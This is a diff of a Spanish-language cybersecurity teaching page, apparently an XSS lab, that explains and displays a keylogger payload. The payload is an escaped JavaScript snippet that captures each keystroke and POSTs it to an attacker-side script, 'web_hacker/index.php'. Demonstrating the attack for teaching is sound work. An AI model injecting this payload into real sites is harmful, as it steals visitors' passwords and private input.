@@ -6,6 +6,16 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
     <title>Ciberseguridad</title>
+
+    <style>
+        em{
+            background-color: #c9c9c9ff;
+            border-radius: 4px;
+            display: block;
+            font-family: monospace;
+            padding: 10px;
+        }
+    </style>
 </head>
 <body class="bg-dark">
     <div class="container mt-5 bg-light rounded p-5 col-lg-8">
@@ -31,13 +41,18 @@
             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-exclamation-triangle-fill" viewBox="0 0 16 16">
                 <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5m.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2"/>
             </svg>    
-            Código malicioso <strong>(keylogger)</strong>
+            <strong>Código malicioso</strong>
             <br>
+            Este <strong>keylogger</strong> se inyecta en el navegador de la víctima y registra cada pulsación de tecla, enviando la información a un servidor controlado por el atacante.
+            <br>
+            Las teclas que presionen los visitantes serán registradas en el siguiente archivo <a href="web_hacker/keylog.txt" target="_blank">keylog.txt</a> que se encuentra en la web del atacante.
+            <em>
             <?php
                 echo htmlspecialchars(
                     "<script>document.onkeypress = function(evt) {evt = evt || window.event;const key = String.fromCharCode(evt.charCode);if (key) {const param = encodeURI(key);fetch('../web_hacker/index.php', {method: 'POST',headers: {'Content-type': 'application/x-www-form-urlencoded'},body: 'key=' + param});}};</script>"
                 );
             ?>
+            </em>
         </p>
         <p>
             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-keyboard" viewBox="0 0 16 16">
